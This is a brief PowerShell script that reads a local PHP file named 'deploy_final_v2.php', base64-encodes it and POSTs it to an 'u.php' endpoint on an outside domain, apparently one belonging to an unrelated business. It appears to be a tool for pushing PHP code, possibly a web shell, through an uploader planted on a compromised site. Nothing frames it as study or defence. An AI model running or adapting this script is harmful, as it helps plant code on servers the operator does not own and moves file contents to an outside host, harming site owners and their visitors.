$bytes = [System.IO.File]::ReadAllBytes("deploy_final_v2.php")
$data = [Convert]::ToBase64String($bytes)
$url = "https://apollo-seikotsuin.jp/u.php"
$body = @{ d = $data }
$response = Invoke-RestMethod -Uri $url -Method Post -Body $body
Write-Host "Response: $response"
